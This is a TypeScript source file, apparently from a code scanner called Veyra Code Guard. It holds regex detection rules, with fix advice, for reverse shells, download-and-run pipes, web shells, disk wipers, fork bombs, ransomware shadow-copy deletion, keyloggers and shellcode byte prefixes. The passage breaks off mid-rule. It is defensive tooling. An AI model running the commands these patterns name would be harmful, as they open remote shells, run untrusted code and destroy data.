// veyra-guard-ignore-file: this file defines the detection rules, so it contains the patterns it looks for.
// The Veyra Code Guard scanner: reads code line by line and reports signs of trojans, backdoors and other
// malicious code. Pure TypeScript with no dependencies, shared by the VS Code extension, the GitHub Action and the CLI.

export type Severity = "critical" | "high" | "medium" | "low";
export const SEVERITIES: Severity[] = ["critical", "high", "medium", "low"];
export const severityRank = (s: Severity) => SEVERITIES.length - SEVERITIES.indexOf(s); // critical 4 … low 1

export interface Finding {
  rule: string;
  title: string;
  severity: Severity;
  line: number;       // 1-based
  column: number;     // 1-based
  endColumn: number;  // 1-based, exclusive
  message: string;    // what was found on this line
  why: string;        // why it matters, in plain words
  fix: string;        // what to do about it
  snippet: string;    // the matched text, made visible (hidden characters shown as <U+202E>)
}

/** What to do about each kind of finding. */
export const FIXES: Record<string, string> = {
  "trojan-source": "Delete the hidden characters (Code Guard's quick fix does it), then re-read the line as it really is. If you didn't add them, treat the change as hostile and find out where it came from.",
  "invisible-character": "Remove the invisible characters, then check the names on the line: a variable with a hidden character is a different variable from the one it looks like.",
  "homoglyph": "Retype the name using plain Latin letters, then search the code for both spellings to see whether a look-alike function was defined somewhere.",
  "hidden-far-right": "Scroll right to read the hidden code, then move it to its own line or remove it. Nothing legitimate needs hundreds of spaces before it.",
  "eval-decoded": "Decode the string and read what it really does. Replace eval/Function with ordinary code; if the code came from someone else, treat it as malicious until proven otherwise.",
  "packed-code": "Unpack it (for example with a JavaScript beautifier) to see what it does, and replace it with the readable source. Don't ship packed code you can't read.",
  "python-exec": "Decode what is being executed and replace exec()/__import__ with normal imports and calls. Hidden execution has no place in reviewed code.",
  "download-execute": "Download to a file, check its checksum or signature, review it, then run it, or pin a specific version through your package manager instead.",
  "reverse-shell": "Remove it and assume the machine that ran it may be compromised: rotate credentials and check for other changes by the same author.",
  "crypto-miner": "Remove the miner and check where it came from (a dependency, a pull request, a build script). Rotate any credentials on machines that ran it.",
  "credential-theft": "Code should never read keys, wallets or browser data it wasn't built for. Remove it; if it ran, rotate the affected keys and passwords.",
  "exfil-endpoint": "Find out what is being sent and why. Remove the endpoint unless it is your own, documented integration, and keep webhook URLs out of source code.",
  "env-exfil": "Read only the variables you need, by name (process.env.API_URL), and never send the whole environment anywhere.",
  "persistence": "Remove the start-up entry unless installing a service is the program's documented purpose, and check machines that ran it for the entry it created.",
  "disable-defences": "Remove it. Software should never turn off antivirus, the firewall or logging; if it ran, re-enable the protections and investigate.",
  "hidden-powershell": "Decode the command and replace it with a readable script. Visible, signed scripts are the norm; hidden encoded ones are a red flag.",
  "insecure-tls": "Keep certificate checks on. For a private certificate authority, trust that authority explicitly (NODE_EXTRA_CA_CERTS, verify='ca.pem') instead of turning checks off.",
  "char-code-obfuscation": "Convert the character codes back to text to see what they spell, and write it as a normal string.",
  "hex-escapes": "Decode the escapes to see what they hide. If it's data, move it to a file; if it's code, rewrite it readably.",
  "base64-blob": "Decode it and check what it is. Move legitimate assets (images, fonts) into files; remove anything executable.",
  "raw-ip-url": "Use your service's domain name, ideally over https. If the address is unknown to you, find out who added it and why.",
  "secret": "Revoke the key with its provider now (deleting it from the code isn't enough: it stays in history), then load the new one from an environment variable or secret store.",
  "install-script": "Remove the install script, or replace it with a reviewed local script. If the package isn't yours, don't install it.",
  "install-hook": "Read the script it runs. If it's needed (building native code), keep it; otherwise remove it, and consider installing with --ignore-scripts.",
  "workflow-injection": "Pass the value through an environment variable (env: TITLE: ${{ github.event.issue.title }}) and use \"$TITLE\" in the script, so it is treated as text, not code.",
  "workflow-pr-target": "Use the pull_request event for building pull requests, or don't check out the pull request's code in pull_request_target jobs.",
  "typosquat-package": "Check the name letter by letter. If you meant the popular package, fix the name, remove the look-alike and its lockfile entry, and rotate any secrets on machines that installed it.",
  "remote-dependency": "Install from the registry with a pinned version, or pin the git dependency to an exact commit you have reviewed.",
  "dependency-confusion": "Use a single index that proxies the public one (--index-url), reserve your private names publicly, and always use https.",
  "unpinned-dependency": "Pin a version range you have reviewed (for example ^4.18.2) and commit the lockfile.",
  "webshell": "Delete it and check the server it was deployed to: a web shell means someone may already have run commands there. Never pass request input to eval, system or include; use fixed commands and an allow-list of values.",
  "remote-code-load": "Never run code fetched at run time. Ship the code with the program, or install it as a pinned, reviewed dependency.",
  "destructive-command": "Remove it. If it is a clean-up step, delete only a specific folder your program created, never a drive, the home folder or the root.",
  "ransomware": "Remove it and check every machine that ran it. Restore from backups kept offline, and report the incident.",
  "keylogger": "Remove the keyboard capture unless recording keys is the program's documented purpose, and never send or store keystrokes.",
  "clipboard-hijack": "Remove it. If it ran, check recent crypto transfers: clipboard hijackers swap the address you paste for the attacker's.",
  "process-injection": "Remove it unless this is a debugger or security tool you trust. Normal programs never write code into other processes.",
  "shellcode": "Remove it and treat the program as malware. Raw machine code run from memory is how attack tools load their payloads.",
  "exec-memory": "Allocate memory as writable or executable, never both. If this is a JIT compiler, mark the line as reviewed.",
  "office-macro": "Remove the macro, or at least the part that downloads or runs programs. Documents should not run commands when opened.",
  "sql-command-exec": "Remove it and turn the feature off on the database server (for example sp_configure 'xp_cmdshell', 0).",
  "build-time-execution": "Install and build scripts should only build. Remove downloads and shell commands, or move them into a reviewed, pinned step.",
  "anti-analysis": "Ordinary programs don't check for debuggers or virtual machines. Remove it, or mark it as reviewed if it is licence protection you trust.",
  "hardcoded-login": "Remove the hard-coded password. Check credentials against a hashed value from your user store, never against a literal in the code.",
  "guard-opt-out": "Make sure each opt-out has a reason in the comment and was agreed in review.",
};

/** A 0-100 score and A-F grade for a set of findings: one critical finding caps the grade at D. */
export function grade(findings: Finding[]) {
  const c = summarize(findings);
  const score = Math.max(0, 100 - (c.critical * 30 + c.high * 12 + c.medium * 4 + c.low));
  const letter = c.critical ? (score >= 40 ? "D" : "F") : c.high ? (score >= 75 ? "B" : score >= 60 ? "C" : score >= 40 ? "D" : "F") : score >= 90 ? "A" : score >= 75 ? "B" : score >= 60 ? "C" : score >= 40 ? "D" : "F";
  const verdict = c.critical ? "Action needed: critical findings" : c.high ? "Review needed: high-risk findings" : c.medium ? "Mostly clean: a few things to check" : c.low ? "Clean: minor notes only" : "Clean: no signs of malicious code";
  return { score, letter, verdict, counts: c };
}

interface Rule {
  id: string;
  title: string;
  severity: Severity;
  why: string;
  /** Regular expression run on every line (flags: g is added). */
  pattern?: RegExp;
  /** Only run on files whose path matches. */
  files?: { test(path: string): boolean };
  /** Skip files whose path matches. */
  skipFiles?: RegExp;
  /** Extra test a pattern match must pass to count (lines are 0-based here; at is the match's 0-based column). */
  accept?: (match: string, lines: string[], index: number, at: number) => boolean;
  /** A team's own rule: also checked in documentation. */
  custom?: boolean;
  /** Custom check for a whole file; returns findings without rule metadata. */
  check?: (lines: string[], path: string) => Array<{ line: number; column: number; length: number; message: string }>;
  message?: (match: string) => string;
}

const MINIFIED = /\.min\.(js|css|mjs)$|[-.]bundle\.js$|(^|\/)(dist|bundle|build|out|vendor)\//i;
const LOCKFILES = /(^|\/)(package-lock\.json|yarn\.lock|pnpm-lock\.yaml|bun\.lockb|Cargo\.lock|poetry\.lock|Gemfile\.lock|composer\.lock|go\.sum)$/i;
const DOCS = /\.(md|markdown|txt|rst|adoc)$/i;

/** Hidden characters, shown visibly so a reviewer can see them. */
export const visible = (text: string) => text.replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f\u00ad\u061c\u115f\u1160\u17b4\u17b5\u180e\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u206f\u3164\ufe00-\ufe0f\ufeff\uffa0]/g,
  c => `<U+${c.codePointAt(0)!.toString(16).toUpperCase().padStart(4, "0")}>`);

const RULES: Rule[] = [
  // ---- Hidden characters and look-alikes (the "Trojan Source" family) ----
  {
    id: "trojan-source", title: "Trojan Source: hidden text-direction characters", severity: "critical",
    pattern: /[\u202a-\u202e\u2066-\u2069]/,
    why: "Bidirectional control characters (CVE-2021-42574) make code display differently from how it runs, so a reviewer sees safe code while the compiler sees something else. They have no place in source code.",
    message: m => `Hidden text-direction character ${visible(m)} on this line.`,
  },
  {
    id: "invisible-character", title: "Invisible character in code", severity: "high",
    pattern: /[\u200b-\u200d\u2060-\u2064\u180e\u3164\u115f\u1160\uffa0\u00ad]/,
    skipFiles: DOCS,
    accept: (_m, lines, i, at) => suspiciousInvisible(lines[i], at),
    why: "Zero-width and blank characters can hide extra code or create look-alike names (two variables that look identical but aren't), a known way to sneak in backdoors.",
    message: m => `Invisible character ${visible(m)} on this line.`,
  },
  {
    id: "homoglyph", title: "Look-alike letters in an identifier", severity: "high",
    skipFiles: /\.(md|markdown|txt|rst|po|pot|json|ya?ml|html?|xml|csv|properties|strings|resx|arb|xlf)$/i,
    check: lines => {
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      // A word that mixes Latin letters with Cyrillic or Greek ones (e.g. "p\u0430ypal" with a Cyrillic \u0430), outside strings and comments.
      const word = /[A-Za-z_$\u0370-\u03ff\u0400-\u04ff][\w$\u0370-\u03ff\u0400-\u04ff]*/g;
      lines.forEach((raw, i) => {
        const line = stripStringsAndComments(raw);
        for (const m of line.matchAll(word)) {
          const w = m[0];
          if (/[A-Za-z]/.test(w) && /[\u0370-\u03ff\u0400-\u04ff]/.test(w)) out.push({ line: i + 1, column: m.index! + 1, length: w.length, message: `"${w}" mixes Latin with Cyrillic or Greek letters.` });
        }
      });
      return out;
    },
    why: "Letters from other alphabets that look identical to Latin ones (Cyrillic \u0430 vs Latin a) let an attacker define a function that looks like a trusted one but is a different, malicious one.",
  },
  {
    id: "hidden-far-right", title: "Code hidden far off to the right", severity: "high",
    skipFiles: new RegExp(`${MINIFIED.source}|${LOCKFILES.source}|\\.(svg|json|map|csv|tsv|txt|md|xml|html?)$`, "i"),
    check: lines => {
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        const m = /^(.*?\S)?([ \t]{120,})(\S.*)$/.exec(line);
        if (m) out.push({ line: i + 1, column: (m[1]?.length ?? 0) + m[2].length + 1, length: m[3].length, message: `${m[2].length} spaces push this code out of view: ${truncate(m[3], 80)}` });
      });
      return out;
    },
    why: "Pushing code hundreds of columns to the right hides it from anyone reading the file without scrolling, a trick used to hide malicious calls in plain sight.",
  },

  // ---- Running hidden or downloaded code ----
  {
    id: "eval-decoded", title: "Running decoded or obfuscated code", severity: "critical",
    // Runners in JavaScript, PowerShell, PHP, Ruby, Lua, VBScript, .NET and Java; decoders in those and Perl and Go.
    pattern: /(?:\b(?:eval|Function|exec|execSync|setTimeout|setInterval|vm\.run\w*|runInNewContext|execScript|Invoke-Expression|iex|create_function|instance_eval|class_eval|module_eval|loadstring)|(?<![.\w])(?:assert|load|Execute|ExecuteGlobal|defineClass)(?=\s*\()|Assembly\]?(?:::|\.)Load|ScriptEngine\w*\.eval)\s*\(?\s*(?:new\s+Function\s*\()?[^;\n]{0,40}?\b(?:atob|unescape|decodeURIComponent|fromCharCode|b64decode|base64\.decode|decodebytes|Buffer\.from\s*\([^)]*['"](?:base64|hex)['"]|FromBase64String|zlib\.(?:inflate|gunzip)\w*|codecs\.decode|bytes\.fromhex|rot13|marshal\.loads|decompress|base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13|hex2bin|convert_uudecode|Base64\.decode64|decode_base64|getDecoder\(\)\.decode|StdEncoding\.DecodeString|unpack\s*\(\s*['"]m)/i,
    // The pattern ignores case, so "Function" also matches the function keyword ("function decompress() {"), which runs nothing.
    accept: m => !m.startsWith("function"),
    why: "Decoding a hidden string and then executing it is the classic way malware hides its real behaviour from reviewers and scanners. Legitimate code almost never needs this.",
    message: m => `Decodes and runs hidden code: ${truncate(m, 80)}`,
  },
  {
    id: "packed-code", title: "Packed (obfuscated) JavaScript", severity: "critical",
    pattern: /eval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e\s*,\s*[dr]\s*\)/,
    why: "This is the signature of a JavaScript packer, which scrambles code so nobody can read what it does. It is common in injected malware.",
    message: () => "JavaScript packed with eval(function(p,a,c,k,e,d)).",
  },
  {
    id: "python-exec", title: "Python running hidden or dynamic code", severity: "critical",
    pattern: /\bexec\s*\(\s*(?:compile\s*\(|__import__|(?:base64|zlib|marshal|codecs|binascii)\.)|__import__\s*\(\s*['"](?:os|subprocess|socket|pty|ctypes)['"]\s*\)\s*\.\s*(?:system|popen|call|Popen|spawn|check_output)/,
    files: /\.(py|pyw|ipynb|pyx)$/i,
    why: "exec() of compiled or decoded data, or __import__('os').system(...), is how Python malware hides commands from readers and simple scanners.",
    message: m => `Hidden command execution: ${truncate(m, 80)}`,
  },
  {
    id: "download-execute", title: "Downloads and runs a program", severity: "critical",
    pattern: /\b(?:curl|wget|fetch)\b[^|;\n]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b|\b(?:curl|wget)\b[^|;\n]*\|\s*(?:python[23]?|perl|ruby|node)\b|\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|Net\.WebClient|DownloadString|DownloadFile)\b[^\n]{0,120}\b(?:iex|Invoke-Expression|Start-Process)\b|\b(?:iex|Invoke-Expression)\b[^\n]{0,60}\b(?:Net\.WebClient|DownloadString|DownloadData|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b|\bcertutil(?:\.exe)?\s+(?:-|\/)urlcache\b|\bmshta(?:\.exe)?\s+["']?https?:|\bbitsadmin(?:\.exe)?\s+\/transfer\b|\bregsvr32(?:\.exe)?\s+[^\n]*\/i:https?:|\brundll32(?:\.exe)?\s+[^\n]*javascript:/i,
    skipFiles: DOCS,
    why: "Piping a downloaded file straight into a shell runs whatever the server sends, with no review. Attackers use exactly this to install backdoors through build and install scripts.",
    message: m => `Downloads and executes code: ${truncate(m, 80)}`,
  },
  {
    id: "reverse-shell", title: "Reverse shell (remote control backdoor)", severity: "critical",
    pattern: /\/dev\/(?:tcp|udp)\/[\w.-]+\/\d+|\b(?:nc|ncat|netcat)\b[^\n]{0,60}\s-(?:e|c)\s|\b(?:bash|sh|zsh)\s+-i\s*>?&|\bpty\.spawn\s*\(\s*['"]\/bin\/(?:ba)?sh|\bsocket\.socket\b[^\n]{0,200}\b(?:dup2|subprocess|pty)\b|\bos\.dup2\s*\(\s*\w+\.fileno\(\)\s*,\s*[012]\s*\)|\bmkfifo\b[^\n]{0,80}\b(?:nc|ncat|netcat)\b|New-Object\s+(?:System\.)?Net\.Sockets\.TCPClient/i,
    why: "A reverse shell connects out to an attacker's server and hands them a command line on the machine running this code: full remote control.",
    message: m => `Opens a remote shell: ${truncate(m, 80)}`,
  },
  {
    id: "crypto-miner", title: "Cryptocurrency miner", severity: "critical",
    pattern: /stratum\+(?:tcp|ssl|tls):\/\/|\bxmrig\b|\bxmr-stak\b|\bcoinhive\b|\bcryptonight\b|\b(?:minexmr|nanopool|supportxmr|moneroocean|nicehash|f2pool|2miners|hashvault|herominers)\.(?:com|org|net|pro)\b|\bcpuminer\b|\bethminer\b|--donate-level\b/i,
    why: "Hidden miners steal CPU and electricity from whoever runs the code to earn cryptocurrency for the attacker. They are one of the most common payloads in poisoned packages.",
    message: m => `Cryptocurrency mining reference: ${truncate(m, 60)}`,
  },

  {
    id: "webshell", title: "Web shell: runs commands sent in a web request", severity: "critical",
    // Request input passed straight to eval, a shell or include: PHP, ASP, JSP, Node.js, Python and Ruby.
    pattern: /\b(?:eval|assert|system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec|create_function|include|include_once|require|require_once|call_user_func(?:_array)?|preg_replace)\s*\(?\s*[^;\n]{0,40}?\$_(?:GET|POST|REQUEST|COOKIE|SERVER|FILES)\b|\$_(?:GET|POST|REQUEST|COOKIE)\s*\[[^\]\n]+\]\s*\(|`\s*\{?\s*\$_(?:GET|POST|REQUEST|COOKIE)\s*\[|\b(?:eval|Execute|ExecuteGlobal)\s*\(?\s*Request(?:\.(?:Form|QueryString|Item))?\s*\(|Runtime\.getRuntime\(\)\.exec\s*\(\s*request\.getParameter|\b(?:eval|exec|execSync|spawn|spawnSync|Function|runInThisContext|runInNewContext)\s*\(\s*req(?:uest)?\.(?:query|body|params|headers|cookies)\b|\b(?:eval|exec|os\.system|os\.popen|subprocess\.\w+)\s*\(\s*request\.(?:args|form|values|GET|POST|data|json|get_json)\b|\b(?:eval|system|exec|instance_eval|%x)\s*\(?\s*params\[/i,
    skipFiles: DOCS,
    why: "Code that hands text from a web request to eval, a shell or include lets anyone who can reach the server run commands on it. It is the defining feature of a web shell, the most common backdoor on hacked websites.",
    accept: m => !m.startsWith("function"),
    message: m => `Runs input from a web request: ${truncate(m, 70)}`,
  },
  {
    id: "remote-code-load", title: "Runs code downloaded at run time", severity: "critical",
    pattern: /(?:(?<![\w.])(?:eval|exec|loadstring|load|execfile|iex|Invoke-Expression|Function)|\binstance_eval|\bclass_eval|\brunIn(?:This|New)Context|Assembly\]?(?:::|\.)Load|\b(?:pickle|cPickle|marshal|dill)\.loads?|\bunserialize)\s*\(\s*[^;\n]{0,80}?(?:\brequests\.(?:get|post)|\burlopen|\burllib\.request|\bfetch\s*\(|\bhttps?\.get|\baxios\b|\bfile_get_contents\s*\(\s*['"]https?:|\bcurl_exec|\bURI\.open|\bopen-uri|\bNet::HTTP|\bHttpClient|\bWebClient|\bDownload(?:String|Data)|\bhttp\.Get|\breqwest|\bHttpGet|\burllib2|\bhttpx\.get)/i,
    skipFiles: DOCS,
    why: "Fetching code from a server and running it means the program does whatever that server says, today and every day after. The code you reviewed is not the code that runs.",
    // "Function" ignoring case is also the function keyword, as in function(){fetch(...)}, which runs nothing.
    accept: m => !m.startsWith("function"),
    message: m => `Runs code fetched from the network: ${truncate(m, 70)}`,
  },
  {
    id: "destructive-command", title: "Wipes disks or deletes everything", severity: "critical",
    pattern: /\brm\s+-(?:[a-zA-Z]*r[a-zA-Z]*f|[a-zA-Z]*f[a-zA-Z]*r)[a-zA-Z]*\s+(?:--no-preserve-root\s+)?["']?(?:\/\*?|~\/?\*?|\$HOME\/?\*?|\$\{HOME\}\/?\*?)["']?(?=\s|$|;|&|\|)|--no-preserve-root\b|\bdd\s+if=\/dev\/(?:zero|u?random)\s+of=\/dev\/(?:sd|nvme|hd|xvd|vd|disk|mmcblk)|:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:|\bformat(?:\.com)?\s+[a-z]:\s*\/[qyx]|\b(?:del|erase)\s+(?:\/[a-z]\s+)*["']?[a-z]:\\\*?["']?(?=\s|$)|\b(?:rd|rmdir)\s+\/s\s+\/q\s+["']?[a-z]:\\["']?(?=\s|$)|\bRemove-Item\b[^\n]{0,200}["'\s](?:[A-Za-z]:\\\*?|\$env:(?:SystemDrive|SystemRoot|USERPROFILE|HOMEDRIVE)\\?\*?)["']?\s[^\n]{0,200}-Recurse|\bshutil\.rmtree\s*\(\s*(?:['"](?:\/|~|[A-Za-z]:\\\\?)['"]|os\.path\.expanduser\(\s*['"]~['"]\s*\)|Path\.home\(\))\s*[,)]|\bfs\.(?:rmSync|rm|rmdirSync|rmdir|promises\.rm)\s*\(\s*(?:['"](?:\/|[A-Za-z]:\\\\)['"]|os\.homedir\(\))\s*,|\bos\.RemoveAll\s*\(\s*"(?:\/|[A-Za-z]:\\\\)"\s*\)|\\{2,4}\.\\{1,2}PhysicalDrive\d/i,
    skipFiles: DOCS,
    why: "Deleting the root, a drive or the home folder, overwriting a disk or starting a fork bomb destroys data. Wipers and protestware hide commands like these in packages and scripts.",
    message: m => `Destroys data: ${truncate(m, 70)}`,
  },
  {
    id: "ransomware", title: "Ransomware behaviour", severity: "critical",
    pattern: /\bvssadmin(?:\.exe)?\s+delete\s+shadows|\bwmic(?:\.exe)?\s+shadowcopy\s+delete|\bwbadmin(?:\.exe)?\s+delete\s+(?:catalog|systemstatebackup)|\bbcdedit(?:\.exe)?\s+\/set\s+\{?\w+\}?\s+(?:recoveryenabled\s+no|bootstatuspolicy\s+ignoreallfailures)|Win32_Shadowcopy[^\n]*\.Delete|\bcipher(?:\.exe)?\s+\/w:|\byour (?:important |personal )?files (?:have been|are|were) (?:encrypted|locked)|\b(?:decrypt|recover|restore) (?:all )?your files\b[^\n]{0,100}\b(?:bitcoin|btc|monero|xmr|ransom|payment|wallet)/i,
    skipFiles: DOCS,
    why: "Deleting backups and shadow copies, turning off recovery, or showing a ransom note is what ransomware does right before or after it encrypts your files.",
    message: m => `Ransomware step: ${truncate(m, 70)}`,
  },
  {
    id: "keylogger", title: "Records what you type", severity: "high",
    pattern: /\bSetWindowsHookEx[AW]?\s*\(\s*(?:WH_KEYBOARD(?:_LL)?|13)\b|\bGetAsyncKeyState\s*\(|\bGetKeyboardState\s*\(|\bfrom\s+pynput\s+import\s+keyboard|\bpynput\.keyboard\.Listener|\bkeyboard\.(?:on_press|on_release|hook|record)\s*\(|\bCGEventTapCreate\s*\(|\/dev\/input\/event\d/,
    skipFiles: new RegExp(`${DOCS.source}|\\.d\\.ts$`, "i"),
    // Games read the keyboard too: it only counts in code (not a comment) in a file that also stores or sends something.
    accept: (_m, lines, i) => !/^\s*(?:\*|\/\/|#|--|\/\*)/.test(lines[i]) && lines.some(l => SENDS.test(l)),
    why: "Capturing every key pressed system-wide, and saving or sending it, is how spyware steals passwords, messages and card numbers as they are typed.",
    message: m => `Captures keystrokes: ${truncate(m, 60)}`,
  },
  {
    id: "clipboard-hijack", title: "Swaps crypto wallet addresses on the clipboard", severity: "critical",
    check: lines => {
      if (!lines.some(l => CLIPBOARD.test(l))) return [];
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        // Minified lines are full of random-looking text; a hijacker's address pattern sits on a line of its own.
        if (line.length > 500) return;
        const m = WALLET.exec(line);
        if (m) out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `Looks for or inserts a crypto wallet address in a file that uses the clipboard: ${truncate(m[0], 50)}` });
      });
      return out;
    },
    skipFiles: new RegExp(`${DOCS.source}|${MINIFIED.source}`, "i"),
    why: "Clipboard hijackers watch for a copied crypto address and replace it with the attacker's, so the money goes to them when you paste. They need only the clipboard and an address pattern.",
  },
  {
    id: "process-injection", title: "Injects code into another program", severity: "high",
    pattern: /\b(?:WriteProcessMemory|CreateRemoteThread(?:Ex)?|NtCreateThreadEx|RtlCreateUserThread|QueueUserAPC|NtQueueApcThread|SetThreadContext|NtUnmapViewOfSection|ZwUnmapViewOfSection)\b/,
    skipFiles: DOCS,
    accept: (_m, lines) => lines.some(l => /\b(?:OpenProcess|VirtualAllocEx|NtAllocateVirtualMemory|CREATE_SUSPENDED)\b/.test(l)),
    why: "Opening another process and writing code into it (process injection or hollowing) lets malware hide inside a trusted program such as explorer.exe and get past antivirus.",
    message: m => `Writes code into another process: ${m}`,
  },
  {
    id: "shellcode", title: "Shellcode (raw attack payload)", severity: "critical",
    pattern: /\\x(?:fc\\x48\\x83\\xe4\\xf0|fc\\xe8\\x8[29]\\x00\\x00\\x00)|0x(?:fc,\s*0x48,\s*0x83,\s*0xe4,\s*0xf0|fc,\s*0xe8,\s*0x8[29],\s*0x00,\s*0x00,\s*0x00)/i,
    why: "These bytes are the start of payloads made by attack frameworks such as Metasploit and Cobalt Strike. Machine code embedded like this is meant to be run straight from memory.",
    message: () => "Starts like a Metasploit or Cobalt Strike payload.",
  },
  {
    id: "exec-memory", title: "Runs raw machine code from memory", severity: "high",
    pattern: /\bVirtual(?:Alloc|Protect)(?:Ex)?\s*\([^\n]*(?:PAGE_EXECUTE_READWRITE|0x40\b)|\bmmap\s*\([^\n]*(?:PROT_WRITE[^\n]*PROT_EXEC|PROT_EXEC[^\n]*PROT_WRITE)|\bMarshal\.GetDelegateForFunctionPointer\b|\bctypes\.(?:windll|cdll)\.kernel32\.(?:VirtualAlloc|RtlMoveMemory|CreateThread)\b|\bmmap\.mmap\s*\([^\n]*PROT_EXEC/,
    skipFiles: DOCS,
    why: "Memory that is both writable and executable lets a program write machine code and jump into it, which is how shellcode loaders run payloads that never touch the disk.",
    message: m => `Executable memory: ${truncate(m, 70)}`,
  },
  {
    id: "office-macro", title: "Macro that downloads or runs programs", severity: "critical",
    check: lines => {
      const autoRun = lines.some(l => /^\s*(?:Private\s+|Public\s+)?Sub\s+(?:Auto_?Open|AutoExec|AutoClose|Auto_Close|Document_Open|Document_Close|Workbook_Open|Workbook_BeforeClose)\b/i.test(l));
      const dropper = lines.some(l => /MSXML2\.(?:Server)?XMLHTTP|Microsoft\.XMLHTTP|WinHttp\.WinHttpRequest/i.test(l)) && lines.some(l => /ADODB\.Stream|SaveToFile/i.test(l));
      if (!autoRun && !dropper) return [];
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        const m = /\bShell\s*\(|WScript\.Shell|Shell\.Application|\.ShellExecute\b|\.Run\s*\(?\s*["\w]|\.Exec\s*\(|URLDownloadToFile\w*|\.SaveToFile\b/i.exec(line);
        if (m) out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `${autoRun ? "A macro that runs when the document opens" : "A script that downloads and saves a file"} ${/SaveToFile|URLDownload/i.test(m[0]) ? "saves a downloaded file" : "runs a program"}: ${truncate(line, 60)}` });
      });
      return out;
    },
    skipFiles: DOCS,
    why: "Macros that run when a document opens and then download or start a program are the classic way malicious Word and Excel files infect a computer.",
  },
  {
    id: "sql-command-exec", title: "Database runs operating-system commands", severity: "high",
    pattern: /\bxp_cmdshell\b|\bsp_OACreate\b[^\n]*(?:WScript\.Shell|Shell\.Application)|\bCOPY\s+\w+\s+(?:\([^)]*\)\s+)?FROM\s+PROGRAM\b|\bsys_exec\s*\(|\bINTO\s+(?:OUTFILE|DUMPFILE)\s+['"][^'"\n]*\.(?:php|jsp|aspx?|sh)['"]/i,
    skipFiles: DOCS,
    why: "xp_cmdshell, COPY FROM PROGRAM and writing script files from SQL turn a database into a way to run commands on its server, a favourite step after SQL injection.",
    message: m => `Runs commands from the database: ${truncate(m, 60)}`,
  },
  {
    id: "build-time-execution", title: "Install or build script downloads or runs commands", severity: "high",
    files: /(^|\/)(setup\.py|build\.rs|[^/]+\.pth)$/i,
    check: (lines, path) => {
      const pth = /\.pth$/i.test(path);
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        // A .pth line runs on every Python start only when it begins with "import".
        if (pth && !/^\s*import\s/.test(line)) return;
        // Building native code is normal; downloads, decoding, eval and shells are not. exec(open("version.py").read()) is a common, harmless idiom.
        const m = pth ? /\b(?:exec|eval|b64decode|base64|subprocess|os\.system|os\.popen|urlopen|urllib|socket|compile)\b/.exec(line)
          : /\b(?:os\.(?:system|popen)|subprocess\.\w+)\s*\([^\n]*?(?:\bcurl\b|\bwget\b|powershell|pwsh|\bbash\b|\bsh\b|\bcmd(?:\.exe)?\b|https?:\/\/)|\burlopen\s*\(|\brequests\.(?:get|post)\s*\(|\burllib\.request\b|\bsocket\.socket\s*\(|\b(?:exec|eval)\s*\((?!\s*open\s*\()|\bb64decode\b|\breqwest::|\bureq::|\bTcpStream::connect|Command::new\s*\(\s*"(?:sh|bash|cmd|powershell|pwsh|curl|wget)"/.exec(line);
        if (m) out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `${pth ? "Runs on every Python start" : /\.rs$/.test(path) ? "Runs during cargo build" : "Runs during pip install"}: ${truncate(line, 70)}` });
      });
      return out;
    },
    why: "setup.py runs on pip install, build.rs on cargo build, and import lines in .pth files every time Python starts. Downloads, shell commands or eval there run on every developer's machine and CI server, unreviewed.",
  },
  {
    id: "anti-analysis", title: "Hides from debuggers or sandboxes", severity: "medium",
    pattern: /\bIsDebuggerPresent\s*\(|\bCheckRemoteDebuggerPresent\s*\(|\bptrace\s*\(\s*PTRACE_TRACEME\b|\b(?:VBoxService|VBoxTray|vmtoolsd|vmwaretray|SbieDll\.dll|wireshark\.exe|procmon\.exe|x64dbg\.exe|ollydbg\.exe|ida64?\.exe)\b/i,
    skipFiles: DOCS,
    why: "Checking for debuggers, virtual machines or analysis tools and behaving differently when found is how malware avoids being studied by security researchers and sandboxes.",
    message: m => `Looks for analysis tools: ${truncate(m, 60)}`,
  },
  {
    id: "hardcoded-login", title: "Hard-coded password check (possible backdoor login)", severity: "medium",
    pattern: /\b(?:if|elif|elsif|when|unless)\b[^\n]{0,40}?\b\w*(?:password|passwd|pwd|passcode|passphrase|master_?key)\s*(?:===?|\.equals\s*\()\s*["'][^"'\s]{4,}["']|\bstrcmp\s*\(\s*\w*(?:password|passwd|pwd)\w*\s*,\s*"[^"\n]{4,}"\s*\)\s*==\s*0/i,
    skipFiles: new RegExp(`${DOCS.source}|(^|/)(tests?|__tests__|spec|specs|fixtures?|e2e)/|[._-](?:test|spec)\\.\\w+$|_test\\.go$`, "i"),
    why: "Comparing a password with a fixed string in the code is how backdoor logins work: anyone who knows (or reads) the magic password gets in, whatever the real account says.",
    message: m => `Compares a password with a fixed value: ${truncate(m, 60)}`,
  },

  // ---- Stealing data ----
  {
    id: "credential-theft", title: "Reads stored passwords, keys or wallets", severity: "high",
